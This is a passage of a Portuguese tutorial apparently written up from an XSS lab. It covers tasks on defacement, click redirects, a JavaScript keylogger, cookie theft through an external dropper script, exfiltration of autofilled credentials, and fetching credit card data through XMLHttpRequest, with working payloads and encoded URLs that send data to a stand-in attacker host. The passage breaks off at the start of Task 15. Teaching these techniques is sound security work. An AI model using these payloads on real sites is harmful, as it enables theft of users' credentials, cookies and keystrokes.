- [http://localhost/06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E](http://localhost/06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E)

![Resultado](/img/posts/2023-06-21-beyond-the-alert-17.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Node/parentNode](https://developer.mozilla.org/en-US/docs/Web/API/Node/parentNode)
- [https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild)
- [https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild)

### *Task 7 - Abusing Event Listeners*

![Task 7](/img/posts/2023-06-21-beyond-the-alert-18.png)

#### Objetivo

O objetivo desta *task* é alterar abusar de um *event listener* para imprimir um alerta com a senha preenchida no campo.

#### Conhecimento Base

Conforme explorado anteriormente, os *event listeners* são funções chamadas em resposta a um evento específico que ocorre em um elemento. Existem uma infinidade de *event listeners* que podem ser utilizados em vários contextos diferentes.

#### Exploração

A primeira coisa a se observar, é que após enviar uma requisição de *login*, duas coisas acontecem:

1. A URL é preenchida com os dados do formulário (algo inconcebível no que diz respeito a segurança, mas considere um exemplo).
2. O campo `email` do formulário fica com ser `value` preenchido com o e-mail informado.

![Campo preenchido](/img/posts/2023-06-21-beyond-the-alert-19.png)

Isso significa que, se o campo e-mail não tiver um tratamento de entrada, é possível preenchê-lo com aspas, para sair do contexto `value` e a partir daí entrar nas propriedades do campo `input`.

Por exemplo, se pegarmos a seguinte *string*:

```
" teste="h41stur
```

Encodá-lo em URL encode:

```
%22%20teste%3D%22h41stur
```

E injetá-lo na URL no parâmetro `email` com a seguinte URL:

- [http://localhost/07/?email=%22%20teste%3D%22h41stur&password=](http://localhost/07/?email=%22%20teste%3D%22h41stur&password=)

Ao checarmos o código HTML da página, veremos que saímos do escopo `value` e criamos uma nova propriedade.

![Contexto alterado](/img/posts/2023-06-21-beyond-the-alert-20.png)

Sabendo desta falha, podemos criar um *event listener* dentro de um *event handler attribute* para ser injetado no elemento `input` da seguinte forma:

```javascript
" onmouseover="
	document.forms[0].onsubmit = function demo () {
		var pass = document.forms[0].elements[1].value;
		alert(pass);
	}
```

Convertendo para *URL Encode*:

```
%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D
```

Gerando a seguinte URL:

- [http://localhost/07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&password=](http://localhost/07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&password=)

Com isso, o código HTML foi alterado e o script injetado no *event listener*.

![Event listener](/img/posts/2023-06-21-beyond-the-alert-21.png)

Desta forma, quando o usuário submeter o formulário com usuário e senha, o alerta será impresso com a senha.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-22.png)

#### Referências

- [https://aws.amazon.com/pt/what-is/event-listener/](https://aws.amazon.com/pt/what-is/event-listener/)
- [https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes)

### *Task 8 - Redirect on Click*

![Task 8](/img/posts/2023-06-21-beyond-the-alert-23.png)

#### Objetivo

O objetivo desta *task* é redirecionar o usuário para qualquer outro lugar, sempre que ele efetuar qualquer clique dentro da página.

#### Conhecimento Base

Conforme explorado anteriormente, os *event listeners* são funções chamadas em resposta a um evento específico que ocorre em um elemento. Existem uma infinidade de *event listeners* que podem ser utilizados em vários contextos diferentes.

Com uso de JavaScript, é possível criar *event listeners* atrelados a qualquer elemento HTML com o método `addEventListener()`.

#### Exploração

É possível criar uma função de redirecionamento, e atrelar um *event listener*  ao próprio `body` do documento.

```html
<script>
	function CaughtClick() {
		window.location = "https://h41stur.com";
	}
	document.body.addEventListener('click', CaughtClick, true);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E](http://localhost/08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E)


Ao acessar a URL, qualquer clique dentro da página levará ao redirecionamento.

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)
### *Task 9 - JavaScript Keylogger*

![Task 9](/img/posts/2023-06-21-beyond-the-alert-24.png)

#### Objetivo

O objetivo desta *task* é criar um *key logger* que irá capturar todas as teclas digitadas por um invasor dentro da página, e enviá-las para a máquina sob controle do atacante.

#### Conhecimento Base

Os atributos globais de manipulador de evento (*event handler*) em HTML são atributos que podem ser adicionados a qualquer elemento HTML para definir o comportamento de um elemento quando um evento específico ocorre. Por exemplo, você pode usar um manipulador de eventos para definir o que acontece quando um usuário clica em um elemento, passa o mouse sobre um elemento, pressiona uma tecla do teclado quando um elemento tem foco, e muito mais.

Alguns exemplos de manipuladores de eventos globais são:

- `onkeypress`: Este manipulador é acionado quando um usuário pressiona uma tecla e depois a solta.
- `onclick`: Este manipulador é acionado quando um usuário clica em um elemento.
- `ondblclick`: Este manipulador é acionado quando um usuário clica duas vezes em um elemento.
- `onmouseover`: Este manipulador é acionado quando um usuário move o cursor do mouse sobre um elemento.
- `onmouseout`: Este manipulador é acionado quando um usuário move o cursor do mouse para fora de um elemento.
- `onkeydown`: Este manipulador é acionado quando um usuário pressiona uma tecla do teclado.
- `onload`: Este manipulador é acionado quando um elemento, como uma imagem ou um script, terminou de carregar.

Cada um desses manipuladores de eventos pode ser usado para chamar uma função JavaScript que define o que acontece quando o evento ocorre.

A única diferença entre um atributo *event handler* e um *event listener* é que os *event handlers* são uma maneira mais antiga e menos flexível de responder a eventos, pois são inseridos de forma estática diretamente no HTML, enquanto os *event listeners* oferecem mais controle e permitem múltiplas funções de *callback* para o mesmo evento no mesmo elemento. 

Eventos que capturam teclas pressionadas, geralmente armazenam este *buffer* em **UTF-16**, para que estes caracteres sejam transformados em uma *string*, pode-se utilizar o método estático `String.fromCharCode()`.

#### Exploração

Para montar este ataque, podemos utilizar o *event handler* `onkeypress` para enviar a tecla pressionada para uma função, que por sua vez vai transformar em uma *string* e enviar via requisição utilizando o *constructor* `Image()` para a máquina sob controle do atacante.

```html
<script>
	document.onkeypress = function KeyLogger(inp) {
		key_pressed = String.fromCharCode(inp.which);
		new Image().src = "http://0.0.0.0:8080/?"+key_pressed;
	}
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/09/?search=%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E](http://localhost/09/?search=%3Cscript%3E%0A%09document.onkeypress%20%3D%20function%20KeyLogger%28inp%29%20%7B%0A%09%09key_pressed%20%3D%20String.fromCharCode%28inp.which%29%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3F%22%2Bkey_pressed%3B%0A%09%7D%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurada para ouvir a requisição feita.

![Servidor Python ouvindo](/img/posts/2023-06-21-beyond-the-alert-13.png)

Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, a cada tecla pressionada, uma requisição será feita para *Python server* contendo seu valor.


![Resultado](/img/posts/2023-06-21-beyond-the-alert-25.png)


#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_attributes)
- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode)

### *Task 10 - Invoking External JS*

![Task 10](/img/posts/2023-06-21-beyond-the-alert-26.png)

#### Objetivo

O objetivo desta *task* é criar invocar um script JavaScript externo que por sua vez vai imprimir um alerta com o *cookie* do usuário, e, em seguida, enviar este *cookie* para a máquina sob controle do atacante.

#### Conhecimento Base

O elemento HTML `<script>` é usado para incorporar código ou dados executáveis; isso é normalmente usado para incorporar ou referir-se ao código JavaScript. 

#### Exploração

Esta exploração se da em duas fases, a primeira consiste em montar um script malicioso e hospedá-lo na máquina sob controle do atacante que será usada como *dropper*, em seguida montamos um script que será injetado no vetor de XSS.

**Script malicioso:**

```javascript
window.addEventListener("load", function() {
    alert(document.cookie);
    new Image().src = "http://0.0.0.0:8080/?cookie=" + document.cookie;
});
```

**Script a ser injetado**

```html
<script src="http://0.0.0.0:8080/script.js"></script>
```

Convertendo para *URL Encode*:

```
%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/10/?search=%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E](http://localhost/10/?search=%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 que hospeda o script malicioso e configurado para ouvir as requisições feitas.

![Python server](/img/posts/2023-06-21-beyond-the-alert-27.png)

Ao acessar a URL, um alerta é impresso com o *cookie*.

![Alerta com o cookie](/img/posts/2023-06-21-beyond-the-alert-28.png)

E logo em seguida este *cookie* é enviado para a máquina do atacante. Perceba as duas requisições efetuadas pela vítima.

![Resolução](/img/posts/2023-06-21-beyond-the-alert-29.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script)

### *Task 11 - Invoking External JS Using JS*

![Task 11](/img/posts/2023-06-21-beyond-the-alert-30.png)

#### Objetivo

O objetivo desta *task*, assim como a anterior, é criar invocar um script JavaScript externo que por sua vez vai imprimir um alerta com o *cookie* do usuário, porém, desta vez, a importação deste script deve ser feito com JavaScript.

#### Conhecimento Base

Já vimos anteriormente que o método `createElement()` nos possibilita criar qualquer elemento HTML em um documento.

Também vimos que o método `appendChild()` nos permite criar um nó filho no DOM com base em um nó pai.

#### Exploração

Seguindo o raciocínio do que já vimos, podemos criar um novo elemento do tipo `script` usando JavaScript e anexá-lo ao documento com o método `appendChild()`. Este novo elemento pode importar nosso script malicioso para a página alvo.

**Script malicioso:**

```javascript
window.addEventListener("load", function() {
    alert(document.cookie);
    new Image().src = "http://0.0.0.0:8080/?cookie=" + document.cookie;
});
```

**Script a ser injetado**

```html
<script>
	var newtag = document.createElement('script');
	newtag.type = "text/javascript";
	newtag.src = "http://0.0.0.0:8080/script.js";
	document.body.appendChild(newtag);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/11/?search=%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E](http://localhost/11/?search=%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 que hospeda o script malicioso e configurado para ouvir as requisições feitas.

![Python server](/img/posts/2023-06-21-beyond-the-alert-27.png)

Ao acessar a URL, um alerta é impresso com o *cookie*.

![Alerta com o cookie](/img/posts/2023-06-21-beyond-the-alert-28.png)

E logo em seguida este *cookie* é enviado para a máquina do atacante. Perceba as duas requisições efetuadas pela vítima.

![Resolução](/img/posts/2023-06-21-beyond-the-alert-29.png)


#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement](https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement)
- [https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild)

### *Task 12 - Stealing Information from Auto-Complete Fields*

![Task 12](/img/posts/2023-06-21-beyond-the-alert-31.png)

#### Objetivo

Um comportamento normal de várias aplicações, é permitir que um usuário salve as credenciais no cofre do navegador, para serem autopreenchidas ao visitar a tela de login. 

Este comportamento, por si só, não é vulnerável, porém se esta página de login é vulnerável a XSS, isto pode ser um problema.

O objetivo desta *task*, é roubar os dados autopreenchidos pela função de armazenar credenciais ativa pela aplicação.

#### Conhecimento Base

Sabendo que pode haver um intervalo, mesmo que seja quase imperceptível entre o carregamento da página, e o carregamento das credenciais salvas no navegador, não podemos inserir um script de ação imediata. É preciso de um tempo de espera, que também não pode ser alto, pois permitirá que o usuário faça alguma ação que impossibilite o ataque.

Pensando nesse intervalo de tempo, podemos utilizar a função global `setTimeout()` que cria um *timer* em milissegundos que executa uma função ou pedaço de código quando o tempo expira.

Neste caso, podemos criar uma função que vai adulterar alguns atributos do formulário como o `action` e o `method`, além de inserir um *auto-submit* quando este *timer* expirar.

Em outras palavras, com um tempo seguro, podemos enviar as informações autopreenchidas para a máquina sob controle do atacante.

#### Exploração

Com o uso da função global `setTimeout()`, podemos executar uma função que irá adulterar o formulário e auto submetê-lo para nossa máquina.

```html
<script>
	window.setTimeout(function() {
		document.forms[0].action = "http://0.0.0.0:8080";
		document.forms[0].method = "GET";
		document.forms[0].submit();
	} ,3000);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/12/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E](http://localhost/12/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080  configurado para ouvir a requisição feita.

![Python server](/img/posts/2023-06-21-beyond-the-alert-32.png)

Ao carregar a página, as credenciais armazenadas são carregadas nos campos do formulário.

![Formulário autopreenchido](/img/posts/2023-06-21-beyond-the-alert-33.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Dados recebidos](/img/posts/2023-06-21-beyond-the-alert-34.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/setTimeout)

### *Task 13 - Stealing Information from Auto-Complete Fields with XMLHttpRequest*

![Task 13](/img/posts/2023-06-21-beyond-the-alert-35.png)

#### Objetivo

O objetivo desta *task*, assim como a anterior, é roubar os dados autopreenchidos pela função de armazenar credenciais ativa pela aplicação, porém utilizando o *constructor* `XMLHttpRequest()`.

#### Conhecimento Base

**AJAX** (*Asynchronous JavaScript and XML*). É uma técnica de desenvolvimento que permite a criação de aplicações interativas. Com AJAX, um navegador pode enviar e receber dados de um servidor de forma assíncrona, sem interferir na exibição e no comportamento da página existente.

Entre as inúmeras implementações do AJAX, algumas interessantes são:

- **Atualizar uma página sem recarregá-la**: com AJAX, você pode atualizar o conteúdo de uma página sem ter que recarregar a página inteira.
- **Enviar dados para um servidor em segundo plano**: com AJAX, você pode enviar dados para um servidor e receber uma resposta sem recarregar a página. 
- **Recuperar dados de um servidor e atualizar a página**: com AJAX, você pode recuperar dados de um servidor e usar esses dados para atualizar a página. 

O *core* do AJAX é o *constructor* `XMLHttpRequest()`, um objeto incorporado nos navegadores que fornece funcionalidades para buscar dados de um servidor de forma assíncrona, sem precisar interromper a interação do usuário com a página atual. Ele é a base para qualquer tipo de interação AJAX no navegador.

Embora o nome sugira que ele é usado para buscar apenas dados XML, na prática, ele pode ser usado para buscar qualquer tipo de dados, incluindo texto simples, JSON, e até mesmo arquivos binários.

#### Exploração

Assim com a *task* anterior, é necessário um tempo mínimo de espera para que o script malicioso entra em ação, portanto ainda precisamos do `setTimeout()`.

Porém, o `XMLHttpRequest()` nos permitirá ser mais *stealth*, uma vez que suas requisições não redirecionam o navegador, e acontecem sem que o usuário perceba.

Desta vez, não será necessário submeter o formulário para a máquina sob controle do atacante, ao invés disso, podemos simplesmente capturar os valores dos campos de usuário e senha, e fazer o *request* de forma silenciosa.

```html
<script>
	window.setTimeout(function() {
		username = document.forms[0].elements[0].value;
		password = document.forms[0].elements[1].value;
		var req = new XMLHttpRequest();
		req.open("GET", "http://0.0.0.0:8080/?username="+username+"&password"+password, true);
		req.send(); 
	}, 3000);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/13/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E](http://localhost/13/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurado para ouvir a requisição feita.

![Python server](/img/posts/2023-06-21-beyond-the-alert-36.png)

Ao carregar a página, as credenciais armazenadas são carregadas nos campos do formulário.

![Dados carregados](/img/posts/2023-06-21-beyond-the-alert-37.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Resposta recebida](/img/posts/2023-06-21-beyond-the-alert-38.png)


#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX](https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

### *Task 14 - Data Exfiltration with XMLHttpRequest GET*

![Task 14](/img/posts/2023-06-21-beyond-the-alert-39.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro *endpoint* da aplicação com uma requisição do tipo GET usando `XMLHttpRequest()`. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial.

#### Conhecimento Base

O *constructor* `XMLHttpRequest()` possui diversas propriedades para lidar com requisições e respostas. Algumas delas são importantes para entendermos a mecânica de ataques.

O `onreadystatechange` é um manipulador de eventos no objeto `XMLHttpRequest` que é chamado sempre que o estado da solicitação muda. Isso significa que será chamado várias vezes durante o ciclo de vida de uma solicitação, desde que é enviada até que a resposta é recebida e processada.

O objeto `XMLHttpRequest` possui uma propriedade `readyState` que fornece o estado atual da solicitação. Aqui estão os possíveis valores para `readyState`:

- **0 (não inicializado)**: O objeto foi criado, mas o método `open()` ainda não foi chamado.
- **1 (carregamento)**: O método `open()` foi chamado, mas o método `send()` ainda não foi chamado.
- **2 (carregado)**: O método `send()` foi chamado, e o *status* e os cabeçalhos estão disponíveis.
- **3 (interativo)**: Os dados estão sendo baixados, e parte dos dados já está disponível.
- **4 (completo)**: Todos os dados foram recebidos e estão disponíveis.

Geralmente, quando você usa `onreadystatechange`, você está interessado no estado 4, que indica que a solicitação foi concluída e a resposta está disponível. O manipulador de eventos `onreadystatechange` geralmente verifica o `readyState` e o *status* HTTP (para confirmar que a solicitação foi bem-sucedida) antes de processar a resposta.

A propriedade `responseText` do objeto `XMLHttpRequest` é usada para capturar o conteúdo da resposta do servidor como uma `string`. Quando uma solicitação é feita ao servidor, a resposta é armazenada nesta propriedade.

Por exemplo, se a solicitação for bem-sucedida e a resposta do servidor for um objeto JSON, você pode usar a propriedade `responseText` para obter essa resposta como uma *string*. Então você pode usar a função `JSON.parse()` para converter essa *string* em um objeto JavaScript que você pode usar em seu código.

#### Exploração

Primeiramente, precisamos entender a arquitetura da aplicação. Seguindo as orientações da aplicação, existe o *endpoint* **/14/creditCard/** que recebe o parâmetro **user** para retornar o número do cartão de crédito. Portanto, ao acessar a URL abaixo, somos levados ao destino.

- [http://localhost/14/creditCard/?user=h41stur](http://localhost/14/creditCard/?user=h41stur)

Com estas informações, podemos criar um objeto do tipo `XMLHttpRequest` que fará uma requisição para este *endpoint*, no entanto, também precisamos ouvir as mudanças do `readyState` com o manipulador `onreadystatechange`, caso seu valor seja alterado para **4** e o *status* code do *response* seja **200**, teremos uma resposta válida do alvo.

```html
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
	if (req.readyState == 4 && req.status == 200) 
	{
		document.getElementById("exploit").innerHTML = req.responseText;
	}
};
req.open("GET", "/14/creditCard/?user=h41stur", true);
req.send();
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/14/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/14/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Conclusão](/img/posts/2023-06-21-beyond-the-alert-40.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText)
- [https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX](https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

### *Task 15 - Data Exfiltration with XMLHttpRequest POST*

![Task 15](/img/posts/2023-06-21-beyond-the-alert-41.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro *endpoint* da aplicação com uma requisição do tipo POST usando `XMLHttpRequest()`. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial.

#### Conhecimento Base

Outra propriedade importante é o `setRequestHeader` do objeto `XMLHttpRequest`, este é usado para definir os cabeçalhos HTTP para uma solicitação. Este método aceita dois argumentos: o nome do cabeçalho e o valor do cabeçalho. Ele é geralmente chamado após o método `open`, mas antes do método `send`.

É importante observar que existem algumas restrições ao uso de `setRequestHeader`. Por razões de segurança, você não pode definir certos cabeçalhos controlados pelo navegador, como `Referer` e `Host`. Além disso, chamar `setRequestHeader` após `send` resultará em um erro.

#### Exploração

